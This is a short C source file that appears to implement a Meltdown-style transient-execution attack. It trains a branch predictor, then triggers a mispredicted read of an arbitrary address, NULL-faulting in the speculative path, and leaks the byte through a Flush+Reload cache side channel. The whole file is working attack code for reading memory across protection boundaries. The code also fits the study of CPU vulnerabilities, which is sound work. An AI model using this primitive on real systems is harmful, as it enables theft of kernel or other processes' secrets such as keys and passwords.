#include "meltdown.h"
#include "fr.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


/// Meltdown attack implementation
MeltdownUS meltdown_init(void) {
    const FlushReload channel = fr_init();
    return (MeltdownUS){._channel = channel};
}

void meltdown_free(MeltdownUS *meltdown) {
    fr_reset(&meltdown->_channel);
    fr_free(&meltdown->_channel);
}

void meltdown_read_if_flag_(const MeltdownUS *meltdown, uint8_t *exception_causer, const uint8_t *addr, int flag) {
    if (flag) {
        *exception_causer = 42;
        const uint8_t secret = *addr;
        fr_leak(&meltdown->_channel, secret);

        // do nothing else in the transient execution
        for (int i = 0; i < 1024; i++) {
        }
    }
}

uint8_t meltdown_read_any(const MeltdownUS *meltdown, const uint8_t *addr) {
    // train branch prediction
    uint8_t valid_byte = 0;
    for (int i = 0; i < 1024; i++) {
        meltdown_read_if_flag_(meltdown, &valid_byte, &valid_byte, 1);
    }

    // misuse trained branch
    fr_reset(&meltdown->_channel);
    meltdown_read_if_flag_(meltdown, NULL, addr, 0);

    return fr_get(&meltdown->_channel);
}
